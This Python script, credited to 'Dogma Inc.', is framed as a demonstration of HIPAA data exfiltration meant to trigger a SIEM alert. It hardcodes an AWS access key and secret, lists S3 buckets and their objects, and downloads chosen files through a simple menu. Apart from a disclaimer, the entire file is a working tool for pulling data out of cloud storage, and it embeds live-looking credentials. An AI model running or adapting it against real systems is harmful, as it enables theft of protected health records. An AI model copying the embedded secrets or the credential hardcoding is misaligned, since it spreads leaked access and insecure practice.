#!/usr/bin/env python3

##############################################################################
#                          !!!!!!DISCLAIMER!!!!!!                            # 
##############################################################################
# The purpose of this code, is to demonstrate an attempted attack, with the 
# goal of HIPPA Data Exfiltration.

# All testing was done on a conrtolled enviorment to show a SIEM event being
# triggered.

# Only use this code on an enviorment you own.

# PLEASE DO NOT USE THIS CODE FOR NEFARIOUS PURPOSES.

# We do not condone using this for malicious purpose, and are not responsible
# if you are caught using our code for malicious purposes.

##############################################################################
#                               Dogma Inc.                                   #                                     
##############################################################################

##############################################################################
# Import Library                                                             #
##############################################################################
import boto3
import os,sys
import awscli
import subprocess

##############################################################################
# Global Variables                                                           #
##############################################################################
s3 = boto3.client('s3',
                  region_name = 'us-west-1',
                  aws_access_key_id = "AKIA3RFJD7OU7BBKAYNH",
                  aws_secret_access_key ="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")


##############################################################################
# Functions                                                                  #
##############################################################################
def ListBuckets():
    print(" ")
    bucketsFound = s3.list_buckets()['Buckets']
    
    for bucket in bucketsFound:
        print(" ")
        print('Bucket name: {}, Created on: {}'.format(bucket['Name'], bucket['CreationDate']))

    print(" ")
    s3bucket=str(input("What bucket do you want to see conents from:"))
    for key in s3.list_objects(Bucket=s3bucket)['Contents']:
        print(" ")
        print ('key.name', key['Key'])

 

def DownloadfrBucket():
    print(" ")
    DLbucket=str(input("What bucket do you want to DL from:"))
    targetFile=str(input("What are we DL: "))
    targetFolder=str(input("Folder: "))
    s3.meta.client.download_file(DLbucket,targetFile,targetFolder)

##############################################################################
# Main                                                                       #
##############################################################################
if __name__ == '__main__':
    while True:
        print("*" * 50)
        print("1. List Buckets")
        print("2: Dl Bucket")
        print("3: Exit")
        print("*" * 50)
        print(" ")
        task=input("Selection:")
        if (task == "1"):
            ListBuckets()
        elif (task == "2"):
            DownloadfrBucket()
        elif (task == "3"):
            break
        else:
            print("Invalid Selection \n")